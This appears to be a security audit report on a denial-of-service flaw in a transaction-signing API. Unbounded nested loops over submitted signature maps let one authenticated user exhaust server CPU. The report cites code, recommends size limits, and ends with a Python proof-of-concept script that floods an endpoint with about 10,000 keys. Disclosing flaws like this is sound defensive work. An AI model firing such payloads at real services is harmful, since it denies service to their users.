### Title
Unbounded Signature Map Processing in `IsSignatureMap` Transform Enables CPU-Exhaustion DoS

### Summary
The `IsSignatureMap` decorator's `Transform` function iterates over all attacker-supplied signature map entries in a triple-nested loop, calling expensive SDK operations (`PublicKey.fromString`, `AccountId.fromString`, `TransactionId.fromString`, `signatureMap.addSignature`) for every entry before any size check occurs. Within the 2 MB body limit, an authenticated attacker can pack thousands of entries into a single request, causing significant CPU consumption that is fully absorbed before the request is ultimately rejected. This is the direct analog of the external report's pattern: unbounded allocation/processing in a loop before validation.

### Finding Description

**Entry points (two endpoints share the same code path):**
- `POST /transactions/:transactionId/signers` → `SignersController.uploadSignatureMap`
- `POST /transactions/signatures/import` → `TransactionsController.importSignatures`

Both call `transformAndValidateDto(UploadSignatureMapDto, body)`.

**Step 1 — `transformAndValidateDto` has no array-length cap.**

`back-end/libs/common/src/dtos/index.ts` lines 13–20:
```ts
export async function transformAndValidateDto<T>(dtoClass, payload) {
  const items = Array.isArray(payload) ? payload : [payload];
  const instances = items.map(item => plainToInstance(dtoClass, item)); // no length check
  await Promise.all(instances.map(instance => validateOrReject(instance)));
  return instances;
}
```
`plainToInstance` triggers the `@IsSignatureMap()` `Transform` for every item in the array.

**Step 2 — `IsSignatureMap` Transform iterates without size guards.**

`back-end/libs/common/src/decorators/is-signature-map.decorator.ts` lines 38–63:
```ts
for (const nodeAccountId in value) {           // no limit on nodes
  for (const transactionId in transactionIds) { // no limit on tx IDs
    for (const publicKey in publicKeys) {        // no limit on keys
      PublicKey.fromString(publicKey);           // expensive EC parse
      AccountId.fromString(nodeAccountId);
      TransactionId.fromString(transactionId);
      signatureMap.addSignature(...);            // allocation per entry
    }
  }
}
```
No size check precedes any of these calls.

**Step 3 — `processTransactionSignatures` iterates again without size guards.**

`back-end/apps/api/src/transactions/signers/signers.service.ts` lines 234–259:
```ts
for (const nodeMap of map.values()) {
  for (const txMap of nodeMap.values()) {
    for (const publicKey of txMap.keys()) {
      sdkTransaction = sdkTransaction.addSignature(publicKey, map); // O(M) per call
      // throws PNY only after the expensive addSignature call
    }
  }
}
```
`addSignature` re-traverses the entire map for each unique key, making the total work O(N × M) where N = unique keys and M = total entries.

**The only size constraint is the 2 MB body limit** set in `back-end/apps/api/src/setup-app.ts` line 43:
```ts
app.use(json({ limit: '2mb' }));
```
Within 2 MB, reusing a single node account ID and transaction ID, an attacker can pack approximately **~10,000 key-signature pairs** (each ~200 bytes). The `IsSignatureMap` transform calls `PublicKey.fromString()` 10,000 times; `processTransactionSignatures` then calls `addSignature` up to 10,000 times, each traversing the 10,000-entry map — yielding up to ~100,000,000 inner operations per request.

The request is rejected only after all this work completes (either `PNY` error in `processTransactionSignatures` or a status check), mirroring the external report's pattern exactly.

### Impact Explanation
A single authenticated user can send one crafted 2 MB request and saturate a CPU core for the duration of the processing. With the IP throttler configured at, for example, 100 requests/minute (`GLOBAL_MINUTE_LIMIT`), an attacker can sustain near-100% CPU load on the API service, degrading or denying service to all other users. No privileged access is required — only a valid JWT obtained through normal registration.

### Likelihood Explanation
Any registered user can exploit this. The attacker needs only:
1. A valid JWT (obtained via normal login).
2. A valid transaction ID (any existing transaction ID, or even a non-existent one — the transform runs before the transaction lookup).
3. A script to generate a 2 MB JSON body with thousands of valid-format ED25519 public keys.

All three are trivially obtainable. The attack is deterministic and reproducible.

### Recommendation
Add size guards **before** the expensive loops:

1. **In `IsSignatureMap` decorator** (`back-end/libs/common/src/decorators/is-signature-map.decorator.ts`), add entry-count checks at the top of the `Transform`:
   ```ts
   const MAX_NODES = 20;
   const MAX_TX_IDS_PER_NODE = 20;
   const MAX_KEYS_PER_TX = 50;
   if (Object.keys(value).length > MAX_NODES) throw new BadRequestException(ErrorCodes.ISNMP);
   ```
   Apply analogous checks for transaction IDs and public keys before entering each nested loop.

2. **In `transformAndValidateDto`** (`back-end/libs/common/src/dtos/index.ts`), cap the array length:
   ```ts
   if (items.length > 100) throw new BadRequestException(ErrorCodes.IB);
   ```

3. **In `processTransactionSignatures`** (`back-end/apps/api/src/transactions/signers/signers.service.ts`), add a guard on the total number of unique keys before the loop.

### Proof of Concept

```python
import requests, json

# 1. Login and get JWT
token = "<valid_jwt>"
base_url = "http://localhost:3000"

# 2. Build a 2 MB signature map with ~10,000 entries
# Reuse one node and one transaction ID; vary only the public key
node = "0.0.3"
tx_id = "0.0.1@1000000000.000000000"
# Valid ED25519 public key format: 64-char hex (32 bytes)
keys = {f"{i:064x}": "aa" * 64 for i in range(1, 10001)}

payload = [{"id": 1, "signatureMap": {node: {tx_id: keys}}}]

# 3. Send the request — observe CPU spike on the server
resp = requests.post(
    f"{base_url}/transactions/1/signers",
    headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"},
    data=json.dumps(payload),
)
# Server will reject (PNY / TNF) but only after processing all 10,000 entries
print(resp.status_code, resp.json())
```

Expected: the server returns a 4xx error, but CPU usage spikes during processing. Repeating at the rate-limit cadence sustains the load. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** back-end/libs/common/src/decorators/is-signature-map.decorator.ts (L38-63)
```typescript
      for (const nodeAccountId in value) {
        const transactionIds = value[nodeAccountId];

        assertNodeAccountIdValid(nodeAccountId, transactionIds);

        for (const transactionId in transactionIds) {
          const publicKeys = transactionIds[transactionId];
          assertTransactionIdValid(transactionId, publicKeys);

          for (const publicKey in publicKeys) {
            const signature = publicKeys[publicKey];
            const decodedSignature = new Uint8Array(decode(signature));

            if (decodedSignature.length === 0) {
              throw new BadRequestException(ErrorCodes.ISNMP);
            }

            signatureMap.addSignature(
              AccountId.fromString(nodeAccountId),
              TransactionId.fromString(transactionId),
              PublicKey.fromString(publicKey),
              decodedSignature,
            );
          }
        }
      }
```

**File:** back-end/apps/api/src/transactions/signers/signers.service.ts (L234-259)
```typescript
    for (const nodeMap of map.values()) {
      for (const txMap of nodeMap.values()) {
        for (const publicKey of txMap.keys()) {
          const raw = publicKey.toStringRaw();

          // Skip duplicates across node/tx maps, and already-processed keys
          if (processedRawKeys.has(raw)) continue;
          processedRawKeys.add(raw);

          // Look up key (raw first, then DER)
          let userKey = userKeyMap.get(raw);
          if (!userKey) {
            userKey = userKeyMap.get(publicKey.toStringDer());
          }
          if (!userKey) throw new Error(ErrorCodes.PNY);

          // Only add the signature once per unique key
          sdkTransaction = sdkTransaction.addSignature(publicKey, map);

          // Only return "new" signers (not already persisted)
          if (!existingSignerIds.has(userKey.id)) {
            userKeys.push(userKey);
          }
        }
      }
    }
```

**File:** back-end/libs/common/src/dtos/index.ts (L13-20)
```typescript
export async function transformAndValidateDto<T extends object>(
  dtoClass: new (...args: any[]) => T,
  payload: T | T[],
): Promise<T[]> {
  const items = Array.isArray(payload) ? payload : [payload];
  const instances = items.map(item => plainToInstance(dtoClass, item));
  await Promise.all(instances.map(instance => validateOrReject(instance)));
  return instances;
```

**File:** back-end/apps/api/src/setup-app.ts (L43-43)
```typescript
  app.use(json({ limit: '2mb' }));
```

**File:** back-end/apps/api/src/transactions/signers/signers.controller.ts (L100-119)
```typescript
  @Post()
  @HttpCode(201)
  async uploadSignatureMap(
    @Body() body: UploadSignatureMapDto | UploadSignatureMapDto[],
    @GetUser() user: User,
    @Query('includeNotifications') includeNotifications?: boolean,
  ): Promise<TransactionSigner[] | UploadSignatureMapResponseDto> {
    const transformedSignatureMaps = await transformAndValidateDto(UploadSignatureMapDto, body);

    const { signers, notificationReceiverIds } = await this.signaturesService.uploadSignatureMaps(
      transformedSignatureMaps,
      user,
    );

    if (includeNotifications) {
      return { signers, notificationReceiverIds };
    }

    return signers;
  }
```
